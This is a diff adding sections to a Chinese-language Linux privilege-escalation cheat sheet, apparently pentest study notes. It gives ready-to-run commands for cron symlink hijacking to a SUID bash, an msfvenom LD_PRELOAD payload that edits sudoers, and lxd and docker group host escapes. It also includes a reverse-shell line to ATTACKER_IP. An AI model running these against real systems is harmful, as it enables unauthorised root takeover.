@@ -149,6 +149,19 @@
         *   `cat /etc/crontab`
         *   检查列出的脚本及其目录的权限 (`ls -l <script_path>`, `ls -ld <script_dir>`)。
     *   **利用**: 修改脚本，添加 `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'` 等。等待任务执行。
+    * **软链接提权:** 在某些情况下，你可能无法修改一个由 root 用户拥有的计划任务脚本，但你对该脚本所在的目录拥有写入权限。这时，可以利用软链接 (Symbolic Link) 来劫持执行流程。
+	1. **创建恶意脚本**: 在可写目录下创建一个你自己的脚本 (`script.sh`)，内容为你希望 root 用户执行的命令（例如，复制 `/bin/bash` 并为其添加 SUID 权限）。
+	    ```
+	    echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > script.sh
+	    chmod +x script.sh
+	    ```
+	2. **创建软链接**: 假设原始的计划任务脚本名为 `backup.sh`，我们先将其删除或重命名，然后创建一个同名的软链接，使其指向我们自己的恶意脚本。
+	    ```
+	    # mv backup.sh backup.sh.bak  (如果需要备份)
+	    # rm backup.sh
+	    ln -sf script.sh backup.sh
+	    ```
+	3. **等待执行**: 当 cron 任务下一次执行 `backup.sh` 时，它实际上会执行 `script.sh`。执行成功后，你就可以通过运行 `/tmp/rootbash -p` 来获得 root shell。
 
 5.  **密码复用与弱密码 (Password Reuse & Weak Passwords)**
     *   **原理**: 在系统配置、数据库连接字符串、脚本中找到的密码，或通过破解 `/etc/shadow` 得到的密码，可能也是 root 或其他高权限用户的密码。尝试 `su root` 或 SSH 登录。
@@ -176,6 +189,16 @@
             3.  编译: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
             4.  执行: `sudo LD_PRELOAD=/path/to/shell.so <command_allowed_by_sudo>`。
             *   **注意**: 此方法通常在实际用户 ID (RUID) 和有效用户 ID (EUID) 不同时（即 `sudo` 提升权限时）`LD_PRELOAD` 会被安全策略忽略，除非 `sudoers` 中明确允许保留该环境变量。
+        * **`LD_PRELOAD` / `LD_LIBRARY_PATH` 环境变量劫持 (具体利用)**: 如果 `sudo -l` 的输出中包含 `env_keep+=LD_PRELOAD`，我们可以利用 `msfvenom` 创建一个恶意的共享对象 (`.so`) 文件，并在运行允许的 `sudo` 命令时预加载它。
+		1. **生成恶意 `.so` 文件**: 使用 `msfvenom` 创建一个 payload，例如，在 `/etc/sudoers.d/` 目录下为我们的用户添加免密 `sudo` 权限。
+		    ```
+		    msfvenom -p linux/x64/exec CMD="echo 'saad ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/saad" AppendExit='true' -f elf-so -o pwn.so
+		    ```
+		2. **上传并执行**: 将 `pwn.so` 上传到目标机器（例如 `/tmp` 目录），然后执行以下命令。
+		    ```
+		    sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/ping
+		    ```
+		    当 `ping` 命令（或任何其他允许的命令）执行时，我们的恶意 `.so` 文件会首先被加载并以 root 权限执行，从而将我们的用户添加到 sudoers 文件中。
 
 7.  **利用 Capabilities**
     *   **原理**: Linux Capabilities 将 root 用户的权限细分，可以赋予普通程序部分 root 权限，而无需 SUID。如果程序拥有危险的 Capability (如 `cap_setuid+ep`)，可能被用来提权。
@@ -221,3 +244,45 @@
             *   `cd <path_to_shared_dir_on_target>`
             *   `./nfs_shell` (此时会以 root 权限执行)
         6.  **清理**: 提权后记得卸载 NFS 共享 (`sudo umount /mnt/nfs_share`)。
+
+10.  **利用 LXD 组 (LXD Group Exploitation)**
+	*   **原理**:LXD 是一个系统容器管理器。如果当前用户属于 `lxd` 组，他们就拥有控制 LXD 的权限，可以通过创建一个特权容器来挂载主机的根文件系统，从而获得对整个系统的 root 访问权限。
+	*   **步骤**:
+	1. **获取/构建 Alpine 镜像**: 在你的攻击机上，克隆 lxd-alpine-builder 仓库并构建一个轻量级的 Alpine Linux 镜像。
+	    ```
+	    git clone https://github.com/saghul/lxd-alpine-builder.git
+	    cd lxd-alpine-builder
+	    ./build-alpine
+	    ```
+	2. **传输并导入镜像**: 将生成的 `.tar.gz` 镜像文件传输到目标机器，然后使用 `lxc` 命令将其导入。
+	    ```
+	    # 在目标机器上
+	    lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
+	    ```
+	3. **初始化特权容器**: 使用导入的镜像创建一个新的**特权**容器。
+	    ```
+	    lxc init alpine attacker -c security.privileged=true
+	    ```
+	4. **挂载主机文件系统**: 将主机的根目录 (`/`) 作为一个磁盘设备挂载到新创建的容器中。
+	    ```
+	    lxc config device add attacker mydevice disk source=/ path=/mnt/root recursive=true
+	    ```
+	5. **进入容器并提权**: 启动容器，并在其中执行一个 shell。
+	    ```
+	    lxc start attacker
+	    lxc exec attacker /bin/sh
+	    ```
+	    
+	    进入容器后，主机的整个文件系统都位于 `/mnt/root` 目录下，你可以对其进行任意读写操作，等同于获得了主机的 root 权限。
+
+10. **利用 Docker 组 (Docker Group Exploitation)**
+	* **原理**: 如果当前用户属于 `docker` 组，他们就可以与 Docker 守护进程通信。这同样可以被用来提权，通过运行一个特权容器并挂载主机的文件系统。
+	* **提权命令**
+		```
+		docker run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt
+		```
+	* **参数分解**
+		- `--privileged`: 授予容器几乎完整的 root 权限，移除所有安全隔离。
+		- `--net=host`: 容器共享主机的网络命名空间。
+		- `-v /:/mnt`: 将主机的根文件系统 (`/`) 挂载到容器的 `/mnt` 目录。
+		- `chroot /mnt`: 将容器的根目录切换到挂载的主机文件系统。执行此命令后，你将直接获得一个主机的 root shell。
